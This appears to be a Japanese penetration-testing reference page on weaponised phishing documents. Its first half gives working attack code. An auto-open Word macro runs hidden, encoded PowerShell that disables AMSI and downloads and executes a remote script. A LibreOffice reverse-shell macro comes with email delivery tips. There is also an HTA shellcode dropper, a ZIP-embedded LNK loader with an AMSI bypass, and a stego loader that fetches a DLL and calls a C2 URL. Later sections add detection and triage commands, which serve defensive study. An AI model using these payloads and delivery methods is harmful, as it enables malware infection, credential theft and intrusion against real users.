# Phishingファイルとドキュメント

{{#include ../../banners/hacktricks-training.md}}

## Officeドキュメント

Microsoft Wordはファイルを開く前に、ファイルデータの検証を行います。データ検証では、OfficeOpenXML標準に照らしてデータ構造を識別します。データ構造の識別中にエラーが発生すると、解析対象のファイルは開かれません。

通常、マクロを含むWordファイルには`.docm`拡張子が使われます。ただし、ファイル拡張子を変更して名前を変更しても、マクロを実行する機能を維持できます。\
たとえば、RTFファイルは設計上マクロをサポートしませんが、DOCMファイルの拡張子をRTFに変更すると、Microsoft Wordで処理され、マクロを実行できます。\
同じ内部構造と仕組みは、Microsoft Office Suiteのすべてのソフトウェア（Excel、PowerPointなど）に当てはまります。

次のコマンドを使用すると、一部のOfficeプログラムで実行される拡張子を確認できます。

```bash
assoc | findstr /i "word excel powerp"
```

リモートテンプレート（ファイル – オプション – アドイン – 管理: テンプレート – 設定）を参照するDOCXファイルにはマクロが含まれている場合があり、マクロを「実行」することもできます。

### 外部画像の読み込み

次の場所に移動します: _挿入 --> クイックパーツ --> フィールド_\
_**カテゴリ**: リンクと参照、**フィールド名**: includePicture、**ファイル名またはURL**: http://<ip>/whatever

![Office Documents - 外部画像の読み込み: 次の場所に移動します: 挿入 -- クイックパーツ -- フィールド](<../../images/image (155).png>)

ドキュメントを作成するのではなく、受信したドキュメントを解析する場合は、[VBAマクロの解析: ジャンクコードとUserForms](../basic-forensic-methodology/specific-software-file-type-tricks/office-file-analysis.md#vba-macro-analysis-junk-code-and-userforms)を参照してください。

### マクロバックドア

マクロを使って、ドキュメントから任意のコードを実行できます。

#### 自動読み込み関数

一般的に使われる関数ほど、AVに検出される可能性が高くなります。

- AutoOpen()
- Document_Open()

#### マクロのコード例

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### 手動でメタデータを削除する

**File > Info > Inspect Document > Inspect Document** に移動すると、Document Inspector が開きます。**Inspect** をクリックし、**Document Properties and Personal Information** の横にある **Remove All** をクリックします。

#### Doc 拡張子

完了したら、**Save as type** のドロップダウンを選択し、形式を **`.docx`** から Word 97-2003 **`.doc`** に変更します。\
これは、**`.docx` にはマクロを保存できず**、マクロ有効形式の **`.docm`** 拡張子には**敬遠される傾向がある**（たとえば、サムネイルアイコンに大きな `!` が表示され、一部の Web／メールゲートウェイでは完全にブロックされる）ためです。したがって、この**旧式の `.doc` 拡張子が最良の妥協案**です。

#### 悪意のあるマクロの生成ツール

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT の自動実行マクロ（Basic）

LibreOffice Writer のドキュメントには Basic マクロを埋め込むことができ、マクロを **Open Document** イベント（Tools → Customize → Events → Open Document → Macro…）に割り当てることで、ファイルを開いたときに自動実行できます。<sup>[[1]](#references)</sup> シンプルな reverse shell マクロは次のようになります：

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

文字列内の二重引用符（`""`）に注意してください。LibreOffice Basicでは、リテラルの引用符をエスケープするために使用されます。そのため、`...==""")`で終わるpayloadでは、内部のコマンドとShell引数の両方で引用符の対応が取れています。

配信のヒント:

- `.odt`として保存し、ドキュメントのイベントにマクロを割り当てて、開いた直後に実行されるようにします。
- `swaks`でメールを送信する際は、`--attach @resume.odt`を使用します（ファイル名ではなく添付ファイルのバイト列を送信するため、`@`が必要です）。これは、検証せずに任意の`RCPT TO`受信者を受け入れるSMTPサーバーを悪用する際に重要です。

## HTAファイル

HTAは、**HTMLとスクリプト言語（VBScriptやJScriptなど）を組み合わせた**Windowsプログラムです。ユーザーインターフェースを生成し、ブラウザーのセキュリティモデルによる制約を受けずに、「完全に信頼された」アプリケーションとして実行されます。

HTAは**`mshta.exe`**を使って実行されます。通常、**Internet Explorer**とともに**インストール**されるため、`mshta`はIEに依存します。そのため、IEがアンインストールされていると、HTAは実行できません。

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## HTMLメール内の偽の添付ファイルカード

HTMLメールには実際の添付ファイルを含めず、メールプロバイダーのネイティブな添付ファイルプレビューカードを模倣できます。Talosは、4つのBase64エンコードされたインラインPNG MIMEパーツから再構成されたGmailカードを確認しました。カード全体は1つのアンカーで囲まれており、`?m=<target-id>` の受信者値によって受信者ごとの追跡が可能になっていました。リンクは `http://` や `https://` ではなく `//` で始まっていました。このプロトコル相対形式はブラウザーでは解決されますが、完全修飾URLのみを照合するURL抽出ツールでは見逃されることがあります。<sup>[[11]](#references)</sup>

分析時には、レンダリングされた添付ファイル一覧を信用せず、生のMIMEを調べてください。インライン画像パーツが視覚的なカードをどのように構成しているかを再構成し、それを囲むアンカーを特定してから、プロトコル相対の `href` 値を正規化してURLを抽出してください。<sup>[[11]](#references)</sup>

エンベロープ/ヘッダーの送信者詐称とDMARCアライメントのテストについては、[SMTP mail spoofing countermeasures](../../network-services-pentesting/pentesting-smtp/index.html#spf-pass-with-an-unaligned-visible-sender)を参照してください。

## NTLM認証の強制

**リモートからNTLM認証を強制する**方法はいくつかあります。たとえば、ユーザーがアクセスするメールやHTMLに**不可視の画像**を追加できます（HTTP MitMでも可能？）。または、**フォルダーを開くだけで**認証を**トリガーする**ファイルの**アドレス**を被害者に送る方法もあります。

**これらのアイデアなどについては、以下のページを確認してください。**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

ハッシュや認証情報を盗むだけでなく、**NTLM relay攻撃も実行できる**ことを忘れないでください。

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads（filelessチェーン）

非常に効果的なキャンペーンでは、正規の偽装文書（PDF/DOCX）2つと悪意のある.lnkを含むZIPを配布します。仕掛けとして、実際のPowerShell loaderはZIPの生バイト列内の一意なマーカーの後ろに格納されており、.lnkがその部分を切り出して、完全にメモリ内で実行します。<sup>[[2]](#references)</sup>

.lnkのPowerShellワンライナーで実装される典型的な流れ：

1) Desktop、Downloads、Documents、%TEMP%、%ProgramData%、および現在の作業ディレクトリの親ディレクトリなど、一般的なパスから元のZIPを探す。
2) ZIPのバイト列を読み込み、ハードコードされたマーカー（例：xFIQCV）を探す。マーカー以降のすべてが埋め込みPowerShell payload。
3) ZIPを%ProgramData%にコピーして展開し、偽装用の.docxを開いて正規のファイルに見せかける。
4) 現在のプロセスでAMSIをバイパスする： [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) 次のステージの難読化を解除し（例：すべての#文字を削除）、メモリ内で実行する。

埋め込みステージを切り出して実行するPowerShellの基本例：

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

メモ
- Deliveryでは、評判のよいPaaSサブドメイン（例：*.herokuapp.com）が悪用されることが多く、payloadsを配信する相手を絞り込む場合もあります（IP/UAに応じて無害なZIPを配信）。
- 次のstageでは、base64/XOR shellcodeを復号し、Reflection.Emit + VirtualAllocで実行して、ディスク上の痕跡を最小限に抑えることがよくあります。

同じchainで使用されるPersistence
- Microsoft Web BrowserコントロールのCOM TypeLib hijackingにより、IE/Explorerや、このコントロールを埋め込んだアプリがpayloadを自動的に再起動します。<sup>[[2]](#references)[[4]](#references)</sup> 詳細とすぐに使えるコマンドはこちら：

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

調査/IOC
- アーカイブデータの末尾にASCIIマーカー文字列（例：xFIQCV）が追加されたZIPファイル。
- 親フォルダー/ユーザーフォルダーを列挙してZIPを探し、おとりドキュメントを開く.lnk。
- [System.Management.Automation.AmsiUtils]::amsiInitFailedによるAMSI tampering。
- 信頼されたPaaSドメイン上のリンクで終わる、長く続く業務上のスレッド。

## LNKでおとりを先に開くstage → scheduled-task persistence → 信頼されたCPL side-loading

繰り返し確認されるパターンの1つは、**ドキュメントを装った`.lnk`**が、バックグラウンドで実際のchainを準備しながら、無害なおとりをすぐに開く手法です。<sup>[[3]](#references)</sup>

確認されたワークフロー：
1. ショートカットは**PDFを装い**、`conhost.exe`などのproxyを使って、難読化されたPowerShell downloaderを起動します。
2. PowerShellでは、明白なtoken（`iw''r`、`g''c''i`、`r''e''n`、`c''p''i`、`&(g''cm sch*)`）を断片化するため、`iwr`、`gci`、`ren`、`cpi`、`schtasks`を探す単純な検出ではコマンドを見逃します。
3. stagerはまず**おとりドキュメントをダウンロード**して被害者に開かせ、その後、バックグラウンドで悪意のあるファイルを再構築します。
4. payloadsは**偽装用の拡張子**で書き込まれ、後から埋め草の文字を削除して名前が変更されることがあります。これにより、明白な`.exe` / `.cpl`の出現が遅れます。
5. ユーザーが書き込み可能なパスにある信頼されたhost binaryを起動する、**分単位のscheduled task**によってPersistenceを確立します。

このパターンを見つけるための最小限の手掛かり：

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

認識しておくと役立つステージング構成:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` or `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### 第2段階がステルス性に優れている理由

Rapid7のケーススタディでは、スケジュールされたタスクが `C:\Users\Public\` から **`Fondue.exe`** を繰り返し起動していました。**`APPWIZ.cpl`** がその隣に配置され、**`RunFODW`** をエクスポートしていたため、信頼されたMicrosoftバイナリは正規のシステムコピーではなく、攻撃者のCPLをサイドロードしました。

CPLは次の処理を行います:
- `C:\Windows\Tasks\editor.dat` から **AES-256-CBC** のblobを読み込む
- **Windows CNG / `bcrypt.dll`** を使って復号する
- 実行可能メモリを割り当て、復号したshellcodeをコピーする
- shellcodeポインターを **`EnumUILanguagesW`** のコールバックとして渡し、間接的に実行する

最後の手順は、別途ハンティングする価値があります。マルウェアは、直接 `((void(*)())buf)()` とジャンプするのを避け、代わりに **コールバックを受け取る正規のWinAPI** を悪用して実行を移すことがよくあります。

このキャンペーンの復号後のpayloadは **Donut** shellcodeで、最終PEを完全にメモリ上にマッピングし、実行を引き継ぐ前に現在のプロセス内で **AMSI/WLDP/ETW** にパッチを適用しました。サイドローディングとメモリ常駐型の後処理について詳しくは、以下を参照してください:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

実践的なハンティングの着眼点:
- `.lnk` が `powershell.exe` または `conhost.exe` を起動し、その後、目に見えるデコイ文書を表示する。
- `C:\Users\Public\` への短時間のダウンロード後、意味のない拡張子から即座に名前が変更される。
- `GoogleErrorReport` のような無難な名前のスケジュールされたタスクが、**ユーザーが書き込み可能なディレクトリ**から実行される。
- 信頼されたバイナリが、同じ非システムディレクトリから **`.cpl` / `.dll`** ファイルを読み込む。
- **`C:\Windows\Tasks\`** にBase64テキストのblobが書き込まれ、サイドロードされたモジュールによって読み込まれる。

## 画像内のステガノグラフィ区切りpayload（PowerShell stager）

最近のloaderチェーンでは、難読化されたJavaScript/VBSが配布され、それがBase64のPowerShell stagerをデコードして実行します。このstagerは画像（多くの場合GIF）をダウンロードします。画像には、固有の開始／終了マーカーの間に、平文として隠されたBase64エンコード済みの.NET DLLが含まれています。スクリプトはこれらの区切り文字（実際に確認された例: «<<sudo_png>> … <<sudo_odt>>>»）を検索し、その間のテキストを抽出してBase64デコードし、アセンブリをメモリ内に読み込んで、C2 URLを指定して既知のエントリメソッドを呼び出します。<sup>[[5]](#references)</sup>

ワークフロー
- ステージ1: アーカイブされたJS/VBS dropper → 埋め込まれたBase64をデコード → -nop -w hidden -ep bypass を指定してPowerShell stagerを起動。
- ステージ2: PowerShell stager → 画像をダウンロードし、マーカーで区切られたBase64を切り出して、.NET DLLをメモリ内に読み込み、そのメソッド（例: VAI）をC2 URLとオプションを渡して呼び出す。
- ステージ3: loaderが最終payloadを取得し、通常はprocess hollowingを使って信頼されたバイナリ（一般的にはMSBuild.exe）にインジェクトする。<sup>[[7]](#references)[[8]](#references)</sup> process hollowingと信頼されたユーティリティを介したプロキシ実行について、詳しくはこちらを参照してください:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

画像からDLLを切り出し、メモリ内で.NETメソッドを呼び出すPowerShellの例:

<details>
<summary>PowerShell stego payload extractor and loader</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

Notes
- これは ATT&CK T1027.003（steganography/marker-hiding）です。<sup>[[6]](#references)</sup> マーカーはキャンペーンごとに異なります。
- AMSI/ETW bypass と文字列の難読化解除は、アセンブリの読み込み前に一般的に行われます。
- ハンティング: ダウンロードされた画像を既知の区切り文字でスキャンし、PowerShell による画像へのアクセスと、その直後の Base64 blob のデコードを特定します。

stego ツールと carving 手法も参照してください:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS dropper → Base64 PowerShell staging

繰り返し確認される初期ステージは、アーカイブ内で配布される、小さく高度に難読化された `.js` または `.vbs` ファイルです。その唯一の目的は、埋め込まれた Base64 文字列をデコードし、`-nop -w hidden -ep bypass` を付けて PowerShell を起動し、HTTPS 経由で次のステージを開始することです。<sup>[[5]](#references)</sup>

ロジックの骨子（概要）:
- ファイル自身の内容を読み込む
- ジャンク文字列の間にある Base64 blob を見つける
- ASCII の PowerShell にデコードする
- `wscript.exe`/`cscript.exe` から `powershell.exe` を呼び出して実行する

ハンティングの手がかり
- コマンドラインに `-enc`/`FromBase64String` を含む `powershell.exe` を起動する、アーカイブ内の JS/VBS 添付ファイル。
- ユーザーの temp パスから `powershell.exe -nop -w hidden` を起動する `wscript.exe`。

## 実行コンテナとしての MSC ドキュメント（GrimResource）

Microsoft Management Console ファイル（`.msc`）は、通常 `mmc.exe` で開く XML のコンソール定義です。**GrimResource** は、古い XSS primitive を含む `apds.dll` リソースへの `StringTable` 参照を悪用します。これにより、細工されたコンソールをユーザーが開くと、JavaScript が `mmc.exe` 内で実行されます。確認されたサンプルでは、`transformNode` ベースの難読化と **DotNetToJScript** を組み合わせ、一般的な Office マクロの経路を使わずに .NET payload をインスタンス化していました。<sup>[[9]](#references)</sup>

静的トリアージでは、信頼できない MSC をテキストとして扱い、**ダブルクリックしないでください**。<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

高シグナルな runtime pivot には、`mmc.exe` による CLR や script コンポーネントの読み込み、ネットワーク接続の作成、`powershell.exe`、`cmd.exe`、`wscript.exe`、`cscript.exe`、`mshta.exe`、`rundll32.exe`、または予期しない実行ファイルの起動があります。この形式自体は正規のものなので、すべての MSC をブロックするのではなく、**起点 + 不審な XML/script コンテンツ + `mmc.exe` の挙動**を関連付けて検知する必要があります。<sup>[[9]](#references)</sup>

## PDF/QR リダイレクターとペイロードの出し分け

PDF は、悪用される脆弱性がなくても有用です。最近のキャンペーンでは、無害そうな文書に**QR code または通常のリンク**を配置し、ブラウザーセッションをメールの保護機能から切り離して、宛先を受信者のアドレスに合わせて個別化しています。Microsoft は、QR URL が受信者ごとに異なり、RaccoonO365 の認証情報窃取インフラにつながる 2025 年の PDF を報告しました。並行して使われた別のチェーンでは、IP/環境に基づくゲーティングにより、選別された訪問者には JavaScript/MSI のパスを返し、スキャナーや許可されていないクライアントには無害な PDF を返していました。<sup>[[10]](#references)</sup>

PDF のアクションと、レンダリングした QR code の両方をトリアージしてください。QR は抽出可能な画像として保存されず、ベクター描画されている場合があるため、埋め込み画像の抽出に加えて、すべてのページをラスタライズしてください:

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

隔離された分析システムから、認証せずにデコード後の宛先とリダイレクトを調べます。追跡に役立つ特徴として、本文がほとんど空でQRコードだけのPDF、クエリパラメーターに埋め込まれた受信者のメールアドレス、信頼性の高いホスティングサービスを経由する複数のリダイレクト、IP、位置情報、Cookie、リファラー、ユーザーエージェントに応じて異なるコンテンツが返されることなどがあります。単一のサンドボックスによる取得では、おとりしか受け取れない場合があるため、条件を制御したプロファイルでリクエストを比較してください。<sup>[[10]](#references)</sup>

## NTLMハッシュを盗むためのWindowsファイル

**NTLM credsを盗む場所**に関するページを確認してください:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – ZipLine Campaign: 米国企業を標的とする高度なフィッシング攻撃](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: 中国をテーマにしたローダーチェーンを通じてDropping Elephantの手口を追跡](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [TypeLibのハイジャック – 新たなCOM永続化手法 (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loaderがさまざまな情報窃取マルウェアを配信](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: 初期アクセスと回避のためのMicrosoft Management Console](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – 脅威アクターが税務シーズンを利用して税金をテーマにしたフィッシングキャンペーンを展開](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
- [11] [Cisco Talos – UAT-11587の配信チェーンとAntinoバックドア](https://blog.talosintelligence.com/china-nexus-uat-11587-targets-government-and-policy-organizations-across-asia-with-antino-backdoor/)
{{#include ../../banners/hacktricks-training.md}}
